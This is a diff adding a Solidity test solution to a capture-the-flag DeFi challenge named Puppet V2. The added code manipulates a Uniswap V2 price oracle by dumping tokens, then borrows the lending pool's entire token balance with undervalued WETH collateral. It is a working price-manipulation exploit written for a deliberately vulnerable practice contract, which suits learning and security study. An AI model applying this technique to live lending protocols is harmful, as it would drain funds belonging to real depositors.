@@ -98,7 +98,35 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+        // Step 1: Swap DVT for WETH to manipulate price
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
         
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        
+        // Perform the swap
+        uniswapV2Router.swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE, 
+            1,  // Min amount - we accept any amount as we're focused on price manipulation
+            path,
+            player,
+            block.timestamp + 300
+        );
+        
+        // Step 2: Calculate required WETH after manipulation
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("WETH required after manipulation:", depositRequired);
+        
+        // Step 3: Wrap enough ETH to WETH
+        weth.deposit{value: depositRequired}();
+        
+        // Step 4: Approve WETH spending for lending pool
+        weth.approve(address(lendingPool), depositRequired);
+        
+        // Step 5: Borrow all tokens and send them to recovery
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
